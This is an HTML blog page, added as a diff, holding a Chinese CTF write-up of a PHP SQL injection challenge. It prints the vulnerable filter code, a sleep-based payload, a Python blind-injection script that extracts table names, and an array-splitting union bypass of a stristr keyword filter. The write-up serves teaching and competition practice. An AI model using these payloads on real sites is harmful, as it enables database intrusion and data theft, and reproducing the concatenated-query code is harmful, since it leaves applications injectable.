@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>一道有意思的注入题 | xjseck&#39;s Home</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="CTF,WEB,PHP," />
+  
+
+  <meta name="description" content="前言“平衡信息”杯-南宁市第二届网络与信息安全技术大赛 web_300题目复现 分析过程先直接上代码123456789101112131415161718192021222324252627282930313233343536$db=&amp;quot;db&amp;quot;;$db_name=&amp;quot;###&amp;quot;;$db_pw=&amp;quot;###&amp;quot;;$host=&amp;quot;localhos">
+<meta name="keywords" content="CTF,WEB,PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一道有意思的注入题">
+<meta property="og:url" content="https://www.xjseck.com/2017/10/16/一道有意思的注入题/index.html">
+<meta property="og:site_name" content="xjseck&#39;s Home">
+<meta property="og:description" content="前言“平衡信息”杯-南宁市第二届网络与信息安全技术大赛 web_300题目复现 分析过程先直接上代码123456789101112131415161718192021222324252627282930313233343536$db=&amp;quot;db&amp;quot;;$db_name=&amp;quot;###&amp;quot;;$db_pw=&amp;quot;###&amp;quot;;$host=&amp;quot;localhos">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-07-15T16:14:28.971Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一道有意思的注入题">
+<meta name="twitter:description" content="前言“平衡信息”杯-南宁市第二届网络与信息安全技术大赛 web_300题目复现 分析过程先直接上代码123456789101112131415161718192021222324252627282930313233343536$db=&amp;quot;db&amp;quot;;$db_name=&amp;quot;###&amp;quot;;$db_pw=&amp;quot;###&amp;quot;;$host=&amp;quot;localhos">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">导航</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">导航</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析过程"><span class="toc-text">分析过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-一道有意思的注入题" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">一道有意思的注入题</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2017.10.16</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>xjseck</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </span>
+
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+        <i class="icon-comment"></i> 
+        <span class="ds-thread-count" data-thread-key="post-一道有意思的注入题"><i class="fa fa-spinner fa-spin"></i></span> 条评论
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>“平衡信息”杯-南宁市第二届网络与信息安全技术大赛 web_300题目复现</p>
+<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>先直接上代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$db=&quot;db&quot;;</span><br><span class="line">$db_name=&quot;###&quot;;</span><br><span class="line">$db_pw=&quot;###&quot;;</span><br><span class="line">$host=&quot;localhost&quot;;</span><br><span class="line">$conn=mysqli_connect($host,$db_name,$db_pw,$db);</span><br><span class="line">if(!$conn)&#123;</span><br><span class="line">    die(mysqli_errno());</span><br><span class="line">&#125;</span><br><span class="line">foreach($_GET as $get)&#123;</span><br><span class="line">    if(is_array($get))&#123;</span><br><span class="line">        foreach($get as $g)&#123;</span><br><span class="line">            if(stristr($g,&apos;select&apos;)!=FALSE &amp;&amp; stristr($g,&apos;union&apos;)!=FALSE)&#123;</span><br><span class="line">                die(&apos;stop attack!&apos;);</span><br><span class="line">            &#125;else if(stristr($g,&apos;select&apos;)!=FALSE &amp;&amp; stristr($g,&apos;from&apos;)!=FALSE)&#123;</span><br><span class="line">                die(&apos;no attack!&apos;);   </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if(stristr($get,&apos;select&apos;)!=FALSE &amp;&amp; stristr($get,&apos;union&apos;)!=FALSE)&#123;</span><br><span class="line">            die(&apos;stop attack!&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">if(is_array($id))&#123;</span><br><span class="line">    $sql=&apos;select * from user where id  in(&apos;.implode(&apos;,&apos;,$id).&apos;)&apos;;</span><br><span class="line">    echo &quot;2=&gt;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $sql=&apos;select * from user where id =&apos;.$id;</span><br><span class="line">    echo &quot;1=&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$result=mysqli_query($conn,$sql);</span><br><span class="line">while($row=mysqli_fetch_array($result))&#123;</span><br><span class="line">    printf(&quot;id: %s&lt;br&gt; Title: %s&lt;br&gt; %s&quot;,$row[0],$row[1],$row[2]);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_free_result($result);</span><br></pre></td></tr></table></figure></p>
+<p>这里有几个trick要注意</p>
+<ol>
+<li><p>首先分析一下流程<br>开始判断传入的id是否是数组如果是就需要过foreach 的if里(stristr函数)的判断<br>否则也要经过if里的判断</p>
+</li>
+<li><p>bypass点<br>stristr函数不区分大小写 返回从搜索的字符串开始，没有搜索到就返回FALSE。<br>如果$get(id的值)不是数组就直接进入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(stristr($get,&apos;select&apos;)!=FALSE &amp;&amp; stristr($get,&apos;union&apos;)!=FALSE)&#123;</span><br><span class="line">        die(&apos;stop attack!&apos;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>也就是不能同时存在select 和 union字符，这一点我们可以使用时间的盲注进行,<br>直接传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=&apos;select * from user where id =&apos;.$id;</span><br><span class="line">//payload select * from user where id =1 and(select(sleep(3)))</span><br></pre></td></tr></table></figure></p>
+<p>简单的写一个bool的盲注脚本,也可以使用sqlmap跑一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">str=string.ascii_letters</span><br><span class="line">str=str+&apos;,&apos;</span><br><span class="line">print str</span><br><span class="line">url=&quot;http://127.0.0.1/&quot;</span><br><span class="line">debug = 0 #当没有数据出现就中断注入</span><br><span class="line">database =&apos;student&apos;</span><br><span class="line">table=&apos;&apos;</span><br><span class="line">for i in range(1,16):</span><br><span class="line">    test=debug</span><br><span class="line">    for x in str:</span><br><span class="line">        #payload =&quot;?id=1 and(ascii(substr(database(),%s,1))=%s)&quot; %(i,ord(x))</span><br><span class="line">        payload=&apos;?id=1 and(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x73747564656E74),%s,1))=%s)&apos; %(i,ord(x))</span><br><span class="line">        u_p=url+payload</span><br><span class="line">        res=requests.get(u_p)</span><br><span class="line">        # print u_p</span><br><span class="line">        if &quot;admin&quot; in res.content:</span><br><span class="line">            table=table+x</span><br><span class="line">            print &quot;table:&quot;,table</span><br><span class="line">            debug=debug+1</span><br><span class="line">            break</span><br><span class="line">    if debug==test:</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure></p>
+<p>如果判断的再死一点，把union关键字换成from，也就是不能同时出现 select 和union了，没有办法遍历出数据库和表了，只能爆破表名和字段了。<br>else走不通了，那我们按照正常的if来走一遍，首先我们知道可以通过url传数组<br>也就是我们利用传数组这样的方式bypass，最终执行的sql语句就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&apos;select * from user where id  in(&apos;.implode(&apos;,&apos;,$id).&apos;)&apos;;</span><br></pre></td></tr></table></figure></p>
+<p>只要能绕过if中的stristr函数的检测就能拼接到sql语句中<br>另一个trick 就是我们传入数组的时候可以这样传入id[]=1&amp;id=2去绕过stristr,也可以拼接到sql语句中按照这样的一个思路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">首先拼接 ) id[]=1)然后是stristr函数id[]= union/*  &amp;id[]=  */select 1,database(),3 #</span><br><span class="line"></span><br><span class="line">//$_GET[id]=$id[]= &#123;  [0] =&gt; -1) union/*     [1] =&gt; */ select 1,user(),3# &#125;</span><br><span class="line"></span><br><span class="line">//最终的sql=select * from user where id in(-1) union/*,*/select 1,user(),3#</span><br></pre></td></tr></table></figure></p>
+<p>成功使用布尔型的注入。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>trick点 url 传数组分段传入输入绕过stristr函数的检测</p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持作者</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2017/09/28/VAuditDemo代码审计/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2017/10/27/git控制管理学习/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+  <section class="duoshuo-comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="post-一道有意思的注入题" 
+      data-title="一道有意思的注入题" data-url="https://www.xjseck.com/2017/10/16/一道有意思的注入题/index.html"></div>
+    <!-- 多说评论框 end -->
+  </section>
+
+
+
+
+  <script type="text/javascript">
+  var duoshuoQuery = {short_name:"forsigner"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+
+
+    
+  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+<script>
+  var cloudTieConfig = {
+    url: document.location.href, 
+    sourceId: "",
+    productKey: "d16a7241e7cd4b389584ed8db2a4e8bc",
+    target: "cloud-tie-wrapper"
+  };
+</script>
+<script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+
+
+    
+
+	<hr />
+	<div id="hypercomments_widget"></div>
+	<script type="text/javascript">
+	_hcwp = window._hcwp || [];
+
+	_hcwp.push({widget:"Stream", widget_id: '89821'});
+
+	(function() {
+
+	if("HC_LOAD_INIT" in window) return;
+
+	HC_LOAD_INIT = true;
+
+	var lang = (navigator.language || navigator.systemLanguage || navigator.userLanguage || "en").substr(0, 2).toLowerCase();
+
+	var hcc = document.createElement("script"); 
+	hcc.type = "text/javascript"; 
+	hcc.async = true;
+	hcc.src = ("https:" == document.location.protocol ? "https" : "http")+"://w.hypercomments.com/widget/hc/"+'89821' +"/"+lang+"/widget.js";
+
+	var s = document.getElementsByTagName("script")[0];
+	s.parentNode.insertBefore(hcc, s.nextSibling);
+	})();
+
+	</script>
+
+	<a href="http://hypercomments.com" class="hc-link" title="comments widget">Powered by HyperComments</a>
+
+
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
